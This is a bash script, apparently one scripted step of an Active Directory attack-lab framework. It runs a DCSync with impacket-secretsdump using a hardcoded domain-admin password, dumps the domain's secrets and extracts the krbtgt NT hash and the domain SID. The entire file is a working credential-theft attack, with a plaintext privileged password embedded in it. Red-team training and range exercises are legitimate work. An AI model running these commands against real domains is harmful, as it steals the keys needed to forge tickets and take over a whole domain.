#!/bin/bash
# CADRE — WT#009 DCSync
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#009 — DCSync"
start_attack "009" "DCSync"

require_tool impacket-secretsdump
require_env DC01 "DC01"
require_env DOMAIN_ROOT "DOMAIN_ROOT"

step "Step 1: DCSync krbtgt hash using chief_command DA credentials"
run_cmd "impacket-secretsdump -just-dc -dc-ip \"$DC01\" \"${NETBIOS_ROOT}/chief_command:C0mm@nd_Ch1ef!@${DC01}\" 2>&1 | tee dcsync_output.txt"

step "Step 2: Extract krbtgt NT hash and domain SID"
run_cmd "grep -E 'krbtgt:|Domain SID' dcsync_output.txt || impacket-secretsdump -just-dc-user krbtgt -dc-ip \"$DC01\" \"${NETBIOS_ROOT}/chief_command:C0mm@nd_Ch1ef!@${DC01}\" 2>&1 | grep -E 'krbtgt|Domain SID' | tee -a dcsync_output.txt"

result $? "DCSync completed"
